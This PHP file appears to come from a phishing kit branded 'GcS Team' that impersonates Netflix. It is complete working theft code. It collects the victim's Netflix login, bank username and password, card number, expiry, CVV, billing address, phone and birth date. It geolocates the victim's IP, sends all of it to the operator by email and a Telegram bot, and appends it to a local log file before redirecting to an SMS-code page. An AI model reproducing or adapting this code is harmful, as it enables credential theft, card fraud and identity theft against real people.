<?php
/*
  ________             _________    ___________                            
 /  _____/    ____    /   _____/    \__    ___/   ____   _____      _____  
/   \  ___  _/ ___\   \_____  \       |    |    _/ __ \  \__  \    /     \ 
\    \_\  \ \  \___   /        \      |    |    \  ___/   / __ \_ |  Y Y  \
 \______  /  \___  > /_______  /      |____|     \___  > (____  / |__|_|  /
        \/       \/          \/                      \/       \/        \/ 
*/
session_start();
include "../../anti/anti1.php";
include "../../anti/anti2.php"; 
include "../../anti/anti3.php"; 
include "../../anti/anti4.php"; 
include "../../anti/anti5.php"; 
include "../../anti/anti7.php";
include '../../email.php';
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$message = "[link: $link ]\r\n";

$_SESSION['username'] = $_POST['username'];
$_SESSION['password1'] = $_POST['password1'];

$file = fopen("NetFlix_RzlT.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");


$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$COUNTRY = $IP_LOOKUP->country . "\r\n";
$countryCode = $IP_LOOKUP->countryCode. "\r\n";
$regionName    = $IP_LOOKUP->regionName . "\r\n";
$lat    = $IP_LOOKUP->lat . "\r\n";
$lon    = $IP_LOOKUP->long . "\r\n";
$timezone    = $IP_LOOKUP->timezone . "\r\n";
$isp    = $IP_LOOKUP->isp . "\r\n";
$as    = $IP_LOOKUP->as . "\r\n";
$CITY    = $IP_LOOKUP->city . "\r\n";
$REGION  = $IP_LOOKUP->region . "\r\n";
$STATE   = $IP_LOOKUP->regionName . "\r\n";
$ZIPCODE = $IP_LOOKUP->zip . "\r\n";


$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$subject = "GcS Team 💖 NetFlix log 💖  $ip";
$headers = "From: GcS-Team<info@GcSTeam.com>";
$send = $email; 


$message = "[GcS Team][+]━━━━━━━━【💖 NetFlix Bank Logs 💖】━━━━━━━━[+][GcS Team]\r\n";
$message .= "[+]━━━━━━━━【🔑 NetFlix Acc】━━━━━━━━[+]\r\n";
$message .= "|Email      : ".$_SESSION['userLoignId']."\r\n";
$message .= "|Password       : ".$_SESSION['password']."\r\n";
$message .= "[+]━━━━━━━━【💳 CC's Bank Acc】━━━━━━━━[+]\r\n";
$message .= "|Bank Name      : ".$_SESSION['bank_name']."\r\n";
$message .= "|Bank ID (username)      : ".$_POST['username']."\r\n";
$message .= "|Bank Passcode (password)     	 : ".$_POST['password1']."\r\n";
$message .= "[+]━━━━━━━━【💳 CC INFO】━━━━━━━━[+]\r\n";
$message .= "|Card Holder        : ".$_SESSION['cardholder']."\r\n";
$message .= "|[💳 Credit Card Number]       : ".$_SESSION['creditCardNumber']."\r\n";
$message .= "|[🔄 Expiry Date ]       : ".$_SESSION['creditExpirationMonth']."\r\n";
$message .= "|[🔑 (CVV)]      : ".$_SESSION['creditCardSecurityCode']."\r\n";
$message .= "|Bank Name          : ".$_SESSION['bank_name']."\r\n";
$message .= "|Card Type           : ".$_SESSION['bank_type']."\r\n";
$message .= "|Card Brand          : ".$_SESSION['bank_brand']."\r\n";
$message .= "[+]━━━━━━━━【📓 Billing INFO】━━━━━━━━[+]\r\n";
$message .= "|First Name          : ".$_SESSION['firstName']."\r\n";
$message .= "|Last Name          : ".$_SESSION['lastName']."\r\n";
$message .= "|Country        : ".$_SESSION['country']."\r\n";
$message .= "|Billing Address [📓]        : ".$_SESSION['address']."\r\n";
$message .= "|Billing Address 2 [📓]       : ".$_SESSION['address2']."\r\n";
$message .= "|Zip code         : ".$_SESSION['zip_code']."\r\n";
$message .= "|City 🌃       : ".$_SESSION['city']."\r\n";
$message .= "|State 🌃        : ".$_SESSION['city']."\r\n";
$message .= "|Phone 📞        : ".$_SESSION['phone']."\r\n";
$message .= "|Date of birth 🎂       : ".$_SESSION['birthday']."\r\n";
$message .= "[+]━━━━━━━━【💻 System INFO】━━━━━━━━[+]\r\n";
$message .=$ip."\nCountry : ".$COUNTRY."City: " .$CITY."Region : " .$REGION."State: " .$STATE."Zip : " .$ZIPCODE."country code: " .$countryCode."lat: " .$lat."lon: " .$lon."timezone: " .$timezone."isp: " .$isp."as: " .$as;
$message .= "UserAgent  :  ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "[GcS Team][+]━━━━━━━━【💖 NetFlix Bank Logs 💖】━━━━━━━━[+][GcS Team]\n";
$_SESSION['message1'] = $message;
mail($send,$subject,$message,$headers);


file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );


$myfile = fopen("NetFlix_RzlT.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);

HEADER("Location: ../sms.php");


?>

